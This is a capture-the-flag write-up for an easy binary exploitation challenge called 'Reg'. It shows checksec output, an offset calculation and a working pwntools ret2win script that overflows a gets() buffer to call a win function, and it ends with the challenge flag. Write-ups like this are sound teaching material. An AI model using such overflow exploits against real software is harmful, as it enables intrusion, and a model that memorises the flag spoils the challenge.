---
title: "Reg"
ctf: "Generic CTF"
date: 2026-06-06
category: pwn
difficulty: easy
flag_format: "HTB{...}"
---

# Reg

## Summary

Simple ret2win via buffer overflow in `run()` — `gets()` reads into a 48-byte buffer with no canary, overwrite the return address to call `winner()` which prints `flag.txt`.

## Solution

### Step 1: Analyze the binary

```
$ file reg
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
$ checksec reg
No Canary, No PIE, NX enabled
```

`run()` allocates 0x30 bytes on the stack and calls `gets()` — classic overflow. `winner()` at `0x401206` opens and prints `flag.txt`.

Offset to return address: `0x30 (buffer) + 8 (saved rbp) = 56 bytes`.

### Step 2: Exploit

```python
from pwn import *

context.arch = 'amd64'

WINNER = 0x401206
RET = 0x40101a  # stack alignment

payload = b'A' * 56
payload += p64(RET)
payload += p64(WINNER)

p = process('./challenge/reg')
p.sendlineafter(b': ', payload)
print(p.recvall().decode())
```

## Flag

```
HTB{N3W_70_pWn}
```
